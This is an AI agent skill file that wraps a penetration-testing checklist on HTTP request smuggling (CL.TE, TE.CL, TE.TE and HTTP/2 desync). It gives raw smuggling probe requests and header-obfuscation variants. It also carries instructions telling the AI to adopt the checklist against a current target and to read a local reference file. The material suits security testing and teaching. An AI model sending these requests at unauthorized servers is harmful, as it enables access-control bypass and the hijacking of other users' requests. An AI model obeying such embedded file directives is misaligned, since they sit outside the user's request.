# SKILL: HTTP Request Smuggling

## Metadata
- **Skill Name**: request-smuggling
- **Folder**: offensive-request-smuggling
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/req-smuggle.md

## Description
HTTP request smuggling checklist: CL.TE, TE.CL, TE.TE variants, detection with timing and differential responses, WAF bypass, cache poisoning, credential hijacking, and request smuggling via HTTP/2. Use when testing reverse proxy/load balancer configurations.

## Trigger Phrases
Use this skill when the conversation involves any of:
`request smuggling, HTTP smuggling, CL.TE, TE.CL, TE.TE, HTTP/2 smuggling, cache poisoning, WAF bypass, differential response, smuggling detection, proxy desync`

## Instructions for Claude

When this skill is active:
1. Load and apply the full methodology below as your operational checklist
2. Follow steps in order unless the user specifies otherwise
3. For each technique, consider applicability to the current target/context
4. Track which checklist items have been completed
5. Suggest next steps based on findings

---

## Full Methodology

# HTTP Request Smuggling

## Mechanisms

HTTP Request Smuggling is a vulnerability that occurs when front-end and back-end servers interpret HTTP requests differently, leading to a desynchronization in the HTTP request processing chain. This desynchronization allows attackers to "smuggle" requests to the back-end server, potentially bypassing security controls or manipulating how other users' requests are processed.

```mermaid
graph TD
    A[Client] -->|HTTP Request| B[Front-end Server]
    B -->|Interpreted Request| C[Back-end Server]
    B -->|Different Interpretation| D[Desynchronization]
    D -->|Smuggled Request| C
    D -->|Security Bypass| E[Unauthorized Access]
    D -->|Queue Poisoning| F[Response Hijacking]
```

Request smuggling vulnerabilities arise from inconsistencies in how servers parse and interpret HTTP messages, particularly regarding:

- **Transfer-Encoding (TE) header**: Indicates chunked encoding
- **Content-Length (CL) header**: Specifies the length of the message body
- **Header parsing**: Different handling of whitespace, newlines, and malformed headers

Common desynchronization scenarios include:

- **CL.TE**: Front-end uses Content-Length, back-end uses Transfer-Encoding
- **TE.CL**: Front-end uses Transfer-Encoding, back-end uses Content-Length
- **TE.TE**: Both servers use Transfer-Encoding but handle edge cases differently

HTTP/2/3 specific desync variants:

- H2.CL / H2.TE: Conflicts between HTTP/2 body length signaling and HTTP/1 backends during downgrade.
- H2C Upgrade: Cleartext HTTP/2 (h2c) upgrade paths mishandled by intermediaries.
- Authority/Host Confusion: `:authority` vs `Host` normalization inconsistencies under CDNs.

```mermaid
graph LR
    subgraph "CL.TE Attack"
        A1[Client] -->|"POST / HTTP/1.1<br>Content-Length: 30<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>X-Ignore:"| B1[Front-end]
        B1 -->|"Uses Content-Length: 30<br>Sees one complete request"| C1[Back-end]
        C1 -->|"Uses Transfer-Encoding<br>Sees two requests:<br>1. POST /<br>2. GET /admin"| D1[Smuggled Request Processed]
    end
```

Modern variations include:

- **H2.HTTP/1**: HTTP/2 to HTTP/1 downgrades causing inconsistencies
- **HTTP/1.H2**: HTTP/1 to HTTP/2 transitions with different interpretations
- **Timeout-based**: Exploiting time differences in connection handling
- **Method-based**: Different interpretations of HTTP methods
- **Header-based**: Inconsistent header parsing between servers

## Hunt

### Identifying Vulnerable Applications

#### Architecture Reconnaissance

- Look for multi-server architectures with proxies, load balancers, or CDNs
- Identify systems using Nginx, HAProxy, Varnish, or Amazon ALB/CloudFront
- Check for HTTP/2 support with HTTP/1 backend compatibility

#### Basic Detection Tests

1. CL.TE Vulnerability Detection (Time Delay Example):

   ```http
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Transfer-Encoding: chunked
   Content-Length: 4

   1
   A
   X
   ```

   Send this request, then send a normal request. If the normal request experiences a time delay, CL.TE might be present.

2. TE.CL Vulnerability Detection (Time Delay Example):

   ```http
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Transfer-Encoding: chunked
   Content-Length: 6

   0

   X
   ```

   Send this request, then send a normal request. If the normal request experiences a time delay, TE.CL might be present.

3. CL.TE Confirmation (Example):

   ```http
   POST / HTTP/1.1
   Host: your-lab-id.web-security-academy.net
   Connection: keep-alive
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 6
   Transfer-Encoding: chunked

   0

   G
   ```

   Send twice. The second response should indicate an unrecognized method like `GPOST`.

4. TE.CL Confirmation (Example):
   (Ensure Burp's "Update Content-Length" is unchecked)

   ```http
   POST / HTTP/1.1
   Host: your-lab-id.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-length: 4
   Transfer-Encoding: chunked

   5c
   GPOST / HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15

   x=1
   0


   ```

   Send twice. The second request should show the effect of the smuggled `GPOST`.

5. TE.TE Desync Detection (Obfuscation Example):
   (Ensure Burp's "Update Content-Length" is unchecked)

   ```http
   POST / HTTP/1.1
   Host: your-lab-id.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-length: 4
   Transfer-Encoding: chunked
   Transfer-encoding: cow

   5c
   GPOST / HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15

   x=1
   0


   ```

   Send twice. The second request should show the effect of the smuggled `GPOST`, confirming that one server ignored the obfuscated `Transfer-encoding: cow` header.

#### Advanced Detection Techniques

- **Differential Testing**: Observe response timing differences
- **Time Delays**: Add artificial delays between requests to detect queue interference
- **Obfuscation Testing**: Try various obfuscation techniques:
  ```http
  Transfer-Encoding: xchunked
  Transfer-Encoding: chunked
  Transfer-Encoding : chunked
  Transfer-Encoding: chunked
  Transfer-Encoding: identity, chunked
  ```

  - HTTP/2 Specific: Duplicate `content-length` headers, mixed/malformed pseudo-headers, abnormal stream resets, header/continuation frame splitting.


---

## 📚 Deep Reference (Progressive Disclosure)

> ⚠️ **CONTEXT OPTIMIZATION:** The detailed methodology, edge cases, attack vectors, and advanced configurations for this skill are stored externally to save tokens.

To access the full technical reference, you MUST use your iew_file tool to read:

d:\xampp\htdocs\0-fonte\.agent\skills\claude-red-offensive-request-smuggling\references\reference.md
